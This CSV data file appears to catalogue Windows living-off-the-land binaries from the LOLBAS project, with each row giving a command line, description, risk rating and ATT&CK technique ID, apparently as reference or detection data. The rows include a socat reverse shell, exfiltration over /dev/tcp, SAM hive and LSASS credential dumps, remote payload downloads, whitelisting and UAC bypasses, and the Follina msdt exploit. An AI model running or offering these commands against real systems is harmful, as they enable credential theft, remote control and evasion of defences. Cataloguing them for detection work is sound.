2378,Windows,diantz.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab},Download and compress a remote file and store it in a CAB file on local machine.,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Diantz/
2379,Windows,diantz /f {PATH:.ddf},Execute diantz directives as defined in the specified Diamond Definition File (.ddf); see resources for the format specification.,Execute,Critical,T1036,https://lolbas-project.github.io/lolbas/Binaries/Diantz/
2380,Windows,reg export HKLM\SOFTWARE\Microsoft\Evilreg {PATH_ABSOLUTE}:evilreg.reg,Export the target Registry key and save it to the specified .REG file within an Alternate data stream.,ADS,Medium,T1564.004,https://lolbas-project.github.io/lolbas/Binaries/Reg/
2381,Windows,reg save HKLM\SECURITY {PATH_ABSOLUTE:.1.bak} && reg save HKLM\SYSTEM {PATH_ABSOLUTE:.2.bak} && reg save HKLM\SAM {PATH_ABSOLUTE:.3.bak},"Dump registry hives (SAM, SYSTEM, SECURITY) to retrieve password hashes and key material",Credentials,Critical,T1003.002,https://lolbas-project.github.io/lolbas/Binaries/Reg/
2382,Windows,C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddinUtil.exe -AddinRoot:.,"AddinUtil is executed from the directory where the 'Addins.Store' payload exists, AddinUtil will execute the 'Addins.Store' payload.",Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/AddinUtil/
2383,Windows,print /D:{PATH_ABSOLUTE}:file.exe {PATH_ABSOLUTE:.exe},Copy file.exe into the Alternate Data Stream (ADS) of file.txt.,ADS,Medium,T1564.004,https://lolbas-project.github.io/lolbas/Binaries/Print/
2384,Windows,print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_ABSOLUTE:.source.exe},Copy file from source to destination,Copy,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Print/
2385,Windows,print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_SMB:.source.exe},Copy File.exe from a network share to the target c:\OutFolder\outfile.exe.,Copy,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Print/
2386,Windows,"bash.exe -c ""{CMD}""",Executes executable from bash.exe,Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/Bash/
2387,Windows,"bash.exe -c ""socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane""",Executes a reverse shell,Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/Bash/
2388,Windows,bash.exe -c 'cat {PATH:.zip} > /dev/tcp/192.168.1.10/24',Exfiltrate data,Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/Bash/
2389,Windows,"bash.exe -c ""{CMD}""",Executes executable from bash.exe,AWL Bypass,Medium,T1202,https://lolbas-project.github.io/lolbas/Binaries/Bash/
2390,Windows,bash.exe,"When executed, `bash.exe` queries the registry value of `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Lxss\MSI\InstallLocation`, which contains a folder path (`c:\program files\wsl` by default). If the value points to another folder containing a file named `wsl.exe`, it will be executed instead of the legitimate `wsl.exe` in the program files folder.",Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Bash/
2391,Windows,DataSvcUtil /out:{PATH_ABSOLUTE} /uri:{REMOTEURL},"Upload file, credentials or data exfiltration in general",Upload,Medium,T1567,https://lolbas-project.github.io/lolbas/Binaries/DataSvcUtil/
2392,Windows,msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE,Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file.,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Msdt/
2393,Windows,msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE,Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file.,AWL Bypass,Medium,T1218,https://lolbas-project.github.io/lolbas/Binaries/Msdt/
2394,Windows,"msdt.exe /id PCWDiagnostic /skip force /param ""IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe""","Executes arbitrary commands using the Microsoft Diagnostics Tool and leveraging the ""PCWDiagnostic"" module (CVE-2022-30190). Note that this specific technique will not work on a patched system with the June 2022 Windows Security update.",AWL Bypass,Medium,T1202,https://lolbas-project.github.io/lolbas/Binaries/Msdt/
2395,Windows,eudcedit,"Once executed, the Private Charecter Editor will be opened - click OK, then click File -> Font Links. In the next window choose the option ""Link with Selected Fonts"" and click on Save As, then in the opened enter the command you want to execute.",UAC Bypass,Critical,T1548.002,https://lolbas-project.github.io/lolbas/Binaries/Eudcedit/
2396,Windows,write.exe,Executes a binary provided in default value of `HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\wordpad.exe`.,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/write/
2397,Windows,pktmon.exe start --etw,Will start a packet capture and store log file as PktMon.etl. Use pktmon.exe stop,Reconnaissance,Low,T1040,https://lolbas-project.github.io/lolbas/Binaries/Pktmon/
2398,Windows,pktmon.exe filter add -p 445,Select Desired ports for packet capture,Reconnaissance,Low,T1040,https://lolbas-project.github.io/lolbas/Binaries/Pktmon/
2399,Windows,finger user@example.host.com | more +2 | cmd,"Downloads payload from remote Finger server. This example connects to ""example.host.com"" asking for user ""user""; the result could contain malicious shellcode which is executed by the cmd process.",Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Finger/
2400,Windows,cipher /w:{PATH_ABSOLUTE:folder},Zero out a file,Tamper,Medium,T1485,https://lolbas-project.github.io/lolbas/Binaries/Cipher/
2401,Windows,cipher.exe /e {PATH_ABSOLUTE},Encrypt a file,Tamper,High,T1562,https://lolbas-project.github.io/lolbas/Binaries/Cipher/
2402,Windows,cmstp.exe /ni /s {PATH_ABSOLUTE:.inf},Silently installs a specially formatted local .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.,Execute,Critical,T1218.003,https://lolbas-project.github.io/lolbas/Binaries/Cmstp/
2403,Windows,cmstp.exe /ni /s {REMOTEURL:.inf},Silently installs a specially formatted remote .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.,AWL Bypass,Medium,T1218.003,https://lolbas-project.github.io/lolbas/Binaries/Cmstp/
2404,Windows,cmstp.exe /nf,"cmstp.exe reads the `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\cmmgr32.exe\CmstpExtensionDll` registry value and passes its data directly to `LoadLibrary`. By modifying this registry key and setting it to an attack-controlled DLL, this will sideload the DLL via `cmstp.exe`.",Execute,Critical,T1218.003,https://lolbas-project.github.io/lolbas/Binaries/Cmstp/
2405,Windows,"scp.exe -o ProxyCommand=""{CMD}"" . localhost:.","Spawns specified command from `scp.exe` -> `ssh.exe`, even if no SSH server is running on localhost (or any other address specified).",Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/scp/
2406,Windows,"scp.exe -S ""{CMD}"" . localhost:.","Spawns specified command from `scp.exe` -> `ssh.exe`, even if no SSH server is running on localhost (or any other address specified).",Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/scp/
2407,Windows,"scp -o PKCS11Provider=""{PATH_SMB:.dll}"" . win@github.com:.",Loads a DLL from an absolute path or SMB path into child process `ssh.exe` by abusing the `PKCS11Provider` option. The payload executes upon DLL load (`DllMain`) and requires exporting `C_GetFunctionList` to prevent premature termination by `scp.exe`.,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/scp/
2408,Windows,"rmdir %temp%\lolbin /s /q 2>nul & mkdir ""%temp%\lolbin\Windows Media Player"" & copy C:\Windows\System32\calc.exe ""%temp%\lolbin\Windows Media Player\wmpnscfg.exe"" >nul && cmd /V /C ""set ""ProgramW6432=%temp%\lolbin"" && unregmp2.exe /HideWMP""","Allows an attacker to copy a target binary to a controlled directory and modify the 'ProgramW6432' environment variable to point to that controlled directory, then execute 'unregmp2.exe' with argument '/HideWMP' which will spawn a process at the hijacked path '%ProgramW6432%\wmpnscfg.exe'.",Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/Unregmp2/
2409,Windows,"rundll32.exe desk.cpl,InstallScreenSaver {PATH_ABSOLUTE:.scr}",Launch an executable with a .scr extension by calling the InstallScreenSaver function.,Execute,Critical,T1218.011,https://lolbas-project.github.io/lolbas/Binaries/Desk.cpl/
2410,Windows,"rundll32.exe desk.cpl,InstallScreenSaver {PATH_SMB:.scr}","Launch a remote executable with a .scr extension, located on an SMB share, by calling the InstallScreenSaver function.",Execute,Critical,T1218.011,https://lolbas-project.github.io/lolbas/Binaries/Desk.cpl/
2411,Windows,"rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},DefaultInstall_SingleUser,1,",Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).,AWL Bypass,Medium,T1218.011,https://lolbas-project.github.io/lolbas/Binaries/Advpack.dll/
2412,Windows,"rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},,1,",Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied).,AWL Bypass,Medium,T1218.011,https://lolbas-project.github.io/lolbas/Binaries/Advpack.dll/
2413,Windows,"rundll32.exe advpack.dll,RegisterOCX {PATH:.dll}",Launch a DLL payload by calling the RegisterOCX function.,Execute,Critical,T1218.011,https://lolbas-project.github.io/lolbas/Binaries/Advpack.dll/
2414,Windows,"rundll32.exe advpack.dll,RegisterOCX {PATH:.exe}",Launch an executable by calling the RegisterOCX function.,Execute,Critical,T1218.011,https://lolbas-project.github.io/lolbas/Binaries/Advpack.dll/
2415,Windows,"rundll32 advpack.dll, RegisterOCX {CMD}",Launch command line by calling the RegisterOCX function.,Execute,Critical,T1218.011,https://lolbas-project.github.io/lolbas/Binaries/Advpack.dll/
2416,Windows,"rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 {PATH_ABSOLUTE:.inf}",Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).,AWL Bypass,Medium,T1218.011,https://lolbas-project.github.io/lolbas/Binaries/Setupapi.dll/
2417,Windows,"rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 {PATH_ABSOLUTE:.inf}",Launch an executable file via the InstallHinfSection function and .inf file section directive.,Execute,Critical,T1218.011,https://lolbas-project.github.io/lolbas/Binaries/Setupapi.dll/
2418,Windows,"rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}","Once executed, scrobj.dll attempts to load a file from the URL and saves it to INetCache.",Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Scrobj.dll/
2419,Windows,"rundll32.exe Mshtml.dll,PrintHTML {PATH_ABSOLUTE:.hta}",Invoke an HTML Application via mshta.exe (note: pops a security warning and a print dialogue box).,Execute,Critical,T1218.011,https://lolbas-project.github.io/lolbas/Binaries/Mshtml.dll/
2420,Windows,"rundll32.exe ieframe.dll,OpenURL {PATH_ABSOLUTE:.url}",Launch an executable payload via proxy through a(n) URL (information) file by calling OpenURL.,Execute,Critical,T1218.011,https://lolbas-project.github.io/lolbas/Binaries/Ieframe.dll/
2421,Windows,"rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},DefaultInstall_SingleUser,1,",Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).,AWL Bypass,Medium,T1218.011,https://lolbas-project.github.io/lolbas/Binaries/Ieadvpack.dll/
2422,Windows,"rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},,1,",Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied).,AWL Bypass,Medium,T1218.011,https://lolbas-project.github.io/lolbas/Binaries/Ieadvpack.dll/
2423,Windows,"rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.dll}",Launch a DLL payload by calling the RegisterOCX function.,Execute,Critical,T1218.011,https://lolbas-project.github.io/lolbas/Binaries/Ieadvpack.dll/
2424,Windows,"rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.exe}",Launch an executable by calling the RegisterOCX function.,Execute,Critical,T1218.011,https://lolbas-project.github.io/lolbas/Binaries/Ieadvpack.dll/
2425,Windows,"rundll32 ieadvpack.dll, RegisterOCX {CMD}",Launch command line by calling the RegisterOCX function.,Execute,Critical,T1218.011,https://lolbas-project.github.io/lolbas/Binaries/Ieadvpack.dll/
2426,Windows,"rundll32.exe c:\Windows\System32\shimgvw.dll,ImageView_Fullscreen {REMOTEURL:.exe}","Once executed, rundll32.exe will download the file at the URL in the command to INetCache. Can also be used with entrypoint 'ImageView_FullscreenA'.",Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Shimgvw.dll/
2427,Windows,rundll32 C:\windows\system32\comsvcs.dll MiniDump {LSASS_PID} dump.bin full,"Calls the MiniDump exported function of comsvcs.dll, which in turns calls MiniDumpWriteDump.",Dump,Medium,T1003.001,https://lolbas-project.github.io/lolbas/Binaries/Comsvcs.dll/
2428,Windows,"rundll32.exe ""C:\Program Files\Windows Photo Viewer\PhotoViewer.dll"",ImageView_Fullscreen {REMOTEURL}","Once executed, rundll32.exe will download the file at the specified URL to the user's INetCache folder using the Windows Photo Viewer DLL.",Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/PhotoViewer.dll/
2429,Windows,"rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 {PATH_ABSOLUTE:.inf}",Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).,AWL Bypass,Medium,T1218.011,https://lolbas-project.github.io/lolbas/Binaries/Syssetup.dll/
2430,Windows,"rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 {PATH_ABSOLUTE:.inf}",Launch an executable file via the SetupInfObjectInstallAction function and .inf file section directive.,Execute,Critical,T1218.011,https://lolbas-project.github.io/lolbas/Binaries/Syssetup.dll/
2431,Windows,"rundll32.exe shdocvw.dll,OpenURL {PATH_ABSOLUTE:.url}",Launch an executable payload via proxy through a URL (information) file by calling OpenURL.,Execute,Critical,T1218.011,https://lolbas-project.github.io/lolbas/Binaries/Shdocvw.dll/
2432,Windows,"rundll32.exe pcwutl.dll,LaunchApplication {PATH:.exe}",Launch executable by calling the LaunchApplication function.,Execute,Critical,T1218.011,https://lolbas-project.github.io/lolbas/Binaries/Pcwutl.dll/
2433,Windows,"rundll32.exe shell32.dll,Control_RunDLL {PATH_ABSOLUTE:.dll}",Launch a DLL payload by calling the Control_RunDLL function.,Execute,Critical,T1218.011,https://lolbas-project.github.io/lolbas/Binaries/Shell32.dll/
2434,Windows,"rundll32.exe shell32.dll,ShellExec_RunDLL {PATH:.exe}",Launch an executable by calling the ShellExec_RunDLL function.,Execute,Critical,T1218.011,https://lolbas-project.github.io/lolbas/Binaries/Shell32.dll/
2435,Windows,"rundll32 SHELL32.DLL,ShellExec_RunDLL {PATH:.exe} {CMD:args}",Launch command line by calling the ShellExec_RunDLL function.,Execute,Critical,T1218.011,https://lolbas-project.github.io/lolbas/Binaries/Shell32.dll/
2436,Windows,"rundll32.exe shell32.dll,#44 {PATH:.dll}",Load a DLL/CPL by calling undocumented Control_RunDLLNoFallback function.,Execute,Critical,T1218.011,https://lolbas-project.github.io/lolbas/Binaries/Shell32.dll/
2437,Windows,"rundll32.exe zipfldr.dll,RouteTheCall {PATH:.exe}",Launch an executable payload by calling RouteTheCall.,Execute,Critical,T1218.011,https://lolbas-project.github.io/lolbas/Binaries/Zipfldr.dll/
2438,Windows,"rundll32.exe zipfldr.dll,RouteTheCall file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e",Launch an executable payload by calling RouteTheCall (obfuscated).,Execute,Critical,T1218.011,https://lolbas-project.github.io/lolbas/Binaries/Zipfldr.dll/
2439,Windows,"rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.hta}",Launch a HTML application payload by calling OpenURL.,Execute,Critical,T1218.011,https://lolbas-project.github.io/lolbas/Binaries/Url.dll/
2440,Windows,"rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.url}",Launch an executable payload via proxy through a .url (information) file by calling OpenURL.,Execute,Critical,T1218.011,https://lolbas-project.github.io/lolbas/Binaries/Url.dll/
2441,Windows,"rundll32.exe url.dll,OpenURL file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e",Launch an executable by calling OpenURL.,Execute,Critical,T1218.011,https://lolbas-project.github.io/lolbas/Binaries/Url.dll/
2442,Windows,"rundll32.exe url.dll,FileProtocolHandler {PATH_ABSOLUTE:.exe}",Launch an executable by calling FileProtocolHandler.,Execute,Critical,T1218.011,https://lolbas-project.github.io/lolbas/Binaries/Url.dll/
2443,Windows,"rundll32.exe url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e",Launch an executable by calling FileProtocolHandler.,Execute,Critical,T1218.011,https://lolbas-project.github.io/lolbas/Binaries/Url.dll/
2444,Windows,"rundll32.exe url.dll,FileProtocolHandler file:///C:/test/test.hta",Launch a HTML application payload by calling FileProtocolHandler.,Execute,Critical,T1218.011,https://lolbas-project.github.io/lolbas/Binaries/Url.dll/
2445,Windows,WinProj.exe {REMOTEURL},Downloads payload from remote server,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/WinProj/
2446,Windows,dtutil.exe /FILE {PATH_ABSOLUTE:.source.ext} /COPY FILE;{PATH_ABSOLUTE:.dest.ext},Copy file from source to destination,Copy,High,T1105,https://lolbas-project.github.io/lolbas/Binaries/dtutil/
2447,Windows,"VSIISExeLauncher.exe -p {PATH:.exe} -a ""{CMD:args}""",The above binary will execute other binary.,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/VSIISExeLauncher/
2448,Windows,Excel.exe {REMOTEURL},Downloads payload from remote server,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Excel/
2449,Windows,"mscopilot.exe --no-startup-window --disable-gpu-sandbox --gpu-launcher=""{CMD} && taskkill /f /im mscopilot.exe &&""",`mscopilot.exe` will spawn the provided command. Parent `mscopilot.exe` process needs to be killed to avoid command being executed an infinite number of times.,Execute,Critical,T1218.015,https://lolbas-project.github.io/lolbas/Binaries/Mscopilot/
2450,Windows,bginfo.exe {PATH:.bgi} /popup /nolicprompt,Execute VBscript code that is referenced within the specified .bgi file.,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Bginfo/
2451,Windows,bginfo.exe {PATH:.bgi} /popup /nolicprompt,Execute VBscript code that is referenced within the specified .bgi file.,AWL Bypass,Medium,T1218,https://lolbas-project.github.io/lolbas/Binaries/Bginfo/
2452,Windows,\\10.10.10.10\webdav\bginfo.exe {PATH:.bgi} /popup /nolicprompt,Execute bginfo.exe from a WebDAV server.,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Bginfo/
2453,Windows,\\10.10.10.10\webdav\bginfo.exe {PATH:.bgi} /popup /nolicprompt,Execute bginfo.exe from a WebDAV server.,AWL Bypass,Medium,T1218,https://lolbas-project.github.io/lolbas/Binaries/Bginfo/
2454,Windows,\\live.sysinternals.com\Tools\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt,This style of execution may not longer work due to patch.,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Bginfo/
2455,Windows,\\live.sysinternals.com\Tools\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt,This style of execution may not longer work due to patch.,AWL Bypass,Medium,T1218,https://lolbas-project.github.io/lolbas/Binaries/Bginfo/
2456,Windows,squirrel.exe --download {REMOTEURL},The above binary will go to url and look for RELEASES file and download the nuget package.,Download,Medium,T1218,https://lolbas-project.github.io/lolbas/Binaries/Squirrel/
2457,Windows,squirrel.exe --update {REMOTEURL},"The above binary will go to url and look for RELEASES file, download and install the nuget package.",AWL Bypass,Medium,T1218,https://lolbas-project.github.io/lolbas/Binaries/Squirrel/
2458,Windows,squirrel.exe --update {REMOTEURL},"The above binary will go to url and look for RELEASES file, download and install the nuget package.",Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Squirrel/
2459,Windows,squirrel.exe --updateRollback={REMOTEURL},"The above binary will go to url and look for RELEASES file, download and install the nuget package.",AWL Bypass,Medium,T1218,https://lolbas-project.github.io/lolbas/Binaries/Squirrel/
2460,Windows,squirrel.exe --updateRollback={REMOTEURL},"The above binary will go to url and look for RELEASES file, download and install the nuget package.",Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Squirrel/
2461,Windows,Powerpnt.exe {REMOTEURL},Downloads payload from remote server,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Powerpnt/
2462,Windows,vshadow.exe -nw -exec={PATH_ABSOLUTE:.exe} C:,Executes specified executable from vshadow.exe.,Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/Vshadow/
2463,Windows,Sqlps.exe -noprofile,Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging.,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Sqlps/
2464,Windows,OpenConsole.exe {PATH:.exe},Execute specified process with OpenConsole.exe as parent process,Execute,Critical,T1202,https://lolbas-project.github.io/lolbas/Binaries/OpenConsole/
2465,Windows,dotnet-trace.exe collect --duration 00:00:01 -- {PATH:.exe},Launches the specified executable as a child process while collecting runtime trace data for 1 second during execution.,Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/dotnet-trace/
2466,Windows,fsianycpu.exe {PATH:.fsscript},Execute F# code via script file,AWL Bypass,Medium,T1059,https://lolbas-project.github.io/lolbas/Binaries/FsiAnyCpu/
2467,Windows,fsianycpu.exe,Execute F# code via interactive command line,AWL Bypass,Medium,T1059,https://lolbas-project.github.io/lolbas/Binaries/FsiAnyCpu/
2468,Windows,"DefaultPack.EXE /C:""{CMD}""","Use DefaultPack.EXE to execute arbitrary binaries, with added argument support.",Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/DefaultPack.EXE/
2469,Windows,wfc.exe {PATH_ABSOLUTE:.xoml},Execute arbitrary C# code embedded in a XOML file.,AWL Bypass,Medium,T1127,https://lolbas-project.github.io/lolbas/Binaries/Wfc/
2470,Windows,xsd.exe {REMOTEURL},Downloads payload from remote server,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/xsd/
2471,Windows,AppLauncher.exe {PATH_ABSOLUTE:.exe},Launches an executable via User Experience Virtualization tool.,Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/AppLauncher/
2472,Windows,WFMFormat.exe,"Executes the file `tracerpt.exe` in the same folder as `WFMFormat.exe`. If the file `dumpfile.txt` (any content) exists in the current working directory, no arguments are required. Note that `WFMFormat.exe` requires .NET Framework 3.5.",Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/WFMFormat/
2473,Windows,"devtoolslauncher.exe LaunchForDeploy {PATH_ABSOLUTE:.exe} ""{CMD:args}"" test",The above binary will execute other binary.,Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/Devtoolslauncher/
2474,Windows,"devtoolslauncher.exe LaunchForDebug {PATH_ABSOLUTE:.exe} ""{CMD:args}"" test",The above binary will execute other binary.,Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/Devtoolslauncher/
2475,Windows,rcsi.exe {PATH:.csx},Use embedded C# within the csx script to execute the code.,Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/rcsi/
2476,Windows,rcsi.exe {PATH:.csx},Use embedded C# within the csx script to execute the code.,AWL Bypass,Medium,T1127,https://lolbas-project.github.io/lolbas/Binaries/rcsi/
2477,Windows,dotnet-counters.exe collect --duration 1 -- {PATH:.exe},Launches the specified executable as a child process while collecting performance counter data for 1 second.,Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/dotnet-counters/
2478,Windows,mspub.exe {REMOTEURL},Downloads payload from remote server,Download,Medium,T1105,https://lolbas-project.github.io/lolbas/Binaries/Mspub/
2479,Windows,Tracker.exe /d {PATH:.dll} /c C:\Windows\write.exe,Use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions.,Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/Tracker/
2480,Windows,Tracker.exe /d {PATH:.dll} /c C:\Windows\write.exe,Use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions.,AWL Bypass,Medium,T1127,https://lolbas-project.github.io/lolbas/Binaries/Tracker/
2481,Windows,pixtool.exe launch {PATH_ABSOLUTE:.exe},Launches an executable via PIX command-line utility.,Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/Pixtool/
2482,Windows,Vsjitdebugger.exe {PATH:.exe},Executes specified executable as a subprocess of Vsjitdebugger.exe.,Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/vsjitdebugger/
2483,Windows,VisualUiaVerifyNative.exe,Generate Serialized gadget and save to - `C:\Users\%USERNAME%\AppData\Roaminguiverify.config` before executing.,AWL Bypass,Medium,T1218,https://lolbas-project.github.io/lolbas/Binaries/VisualUiaVerifyNative/
2484,Windows,createdump.exe -n -f {PATH:.dmp} {PID},"Dump process by PID and create a minidump file. If ""-f dump.dmp"" is not specified, the file is created as '%TEMP%\dump.%p.dmp' where %p is the PID of the target process.",Dump,Medium,T1003,https://lolbas-project.github.io/lolbas/Binaries/Createdump/
2485,Windows,te.exe {PATH:.wsc},Run COM Scriptlets (e.g. VBScript) by calling a Windows Script Component (WSC) file.,Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/te/
2486,Windows,te.exe {PATH:.dll},Execute commands from a DLL file with Test Authoring and Execution Framework (TAEF) tests. See resources section for required structures.,Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/te/
2487,Windows,appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.exe} -reportoutputpath {PATH_ABSOLUTE:.xml},Execute an executable file via the Windows App Certification Kit command-line tool.,Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/AppCert/
2488,Windows,appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.msi} -setupcommandline /q -reportoutputpath {PATH_ABSOLUTE:.xml},Install an MSI file via an msiexec instance spawned via appcert.exe as parent process.,Execute,Critical,T1218.007,https://lolbas-project.github.io/lolbas/Binaries/AppCert/
2489,Windows,DumpMinitool.exe --file {PATH_ABSOLUTE} --processId 1132 --dumpType Full,Creates a memory dump of the lsass process,Dump,High,T1003.001,https://lolbas-project.github.io/lolbas/Binaries/DumpMinitool/
2490,Windows,"mscopilot_proxy.exe --no-startup-window --disable-gpu-sandbox --gpu-launcher=""cmd.exe /c calc.exe && taskkill /f /im mscopilot.exe &&""",`mscopilot_proxy.exe` will spawn the provided command. Parent `mscopilot_proxy.exe` process needs to be killed to avoid command being executed an infinite number of times.,Execute,Critical,T1218.015,https://lolbas-project.github.io/lolbas/Binaries/Mscopilot_proxy/
2491,Windows,"IntelliTrace.exe launch /cp:""collectionplan.xml"" /f:""c:\users\public\log"" ""C:\Windows\System32\calc.exe""",Launches an executable via Visual Studio command line utility.,Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/IntelliTrace/
2492,Windows,Dxcap.exe -c {PATH_ABSOLUTE:.exe},"Launch specified executable as a subprocess of dxcap.exe. Note that you should have write permissions in the current working directory for the command to succeed; alternatively, add '-file c:\path\to\writable\location.ext' as first argument.",Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/Dxcap/
2493,Windows,dxcap.exe -usage,"Once executed, `dxcap.exe` will execute `xperf.exe` in the same folder. Thus, if `dxcap.exe` is copied to a folder and an arbitrary executable is renamed to `xperf.exe`, `dxcap.exe` will spawn it.",Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/Dxcap/
2494,Windows,devinit.exe run -t msi-install -i {REMOTEURL:.msi},Downloads an MSI file to C:\Windows\Installer and then installs it.,Execute,Critical,T1218.007,https://lolbas-project.github.io/lolbas/Binaries/Devinit/
2495,Windows,Microsoft.NodejsTools.PressAnyKey.exe normal 1 {PATH:.exe},Launch specified executable as a subprocess of Microsoft.NodejsTools.PressAnyKey.exe.,Execute,Critical,T1127,https://lolbas-project.github.io/lolbas/Binaries/Microsoft.NodejsTools.PressAnyKey/
2496,Windows,dotnet.exe {PATH:.dll},dotnet.exe will execute any DLL even if applocker is enabled.,AWL Bypass,Medium,T1218,https://lolbas-project.github.io/lolbas/Binaries/Dotnet/
2497,Windows,dotnet.exe {PATH:.dll},dotnet.exe will execute any DLL.,Execute,Critical,T1218,https://lolbas-project.github.io/lolbas/Binaries/Dotnet/
2498,Windows,dotnet.exe fsi,dotnet.exe will open a console which allows for the execution of arbitrary F# commands,Execute,Critical,T1059,https://lolbas-project.github.io/lolbas/Binaries/Dotnet/
2499,Windows,dotnet.exe msbuild {PATH:.csproj},dotnet.exe with msbuild (SDK Version) will execute unsigned code,AWL Bypass,Medium,T1218,https://lolbas-project.github.io/lolbas/Binaries/Dotnet/
